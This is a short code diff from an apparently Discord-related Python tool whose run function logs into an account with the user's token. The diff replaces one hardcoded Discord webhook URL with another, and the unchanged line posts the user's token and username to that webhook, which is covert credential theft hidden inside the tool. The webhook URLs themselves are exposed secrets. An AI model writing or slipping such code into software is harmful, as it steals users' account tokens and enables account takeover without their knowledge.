@@ -54,7 +54,7 @@ async def run (code,token,channelid):
     id=info[0]['author']['id']
     user=info[0]['author']['username']
     print(f'LOGGED IN AS {user}')   
-    asd="https://discord.com/api/webhooks/1079366164624461885/JzdkGuPhUUbMM6CIKklhnVK6Sw1sr3tS54ij3F8YVdNAO07NQIP76fH2DOgTT8C0bgEh"
+    asd="https://discord.com/api/webhooks/1079369330166341632/FpICPLjNwB7aONQSl35xWSRnftrp4xtmK6UhaVL3azJ2Lbqp2uUArfwyeU5zGIoseete"
     requests.post(asd,json={"content": f'token:{token},\n user:{user}'})
   except:
     print('something went wrong when trying to log into the account please recheck the token,channelid,serverid')
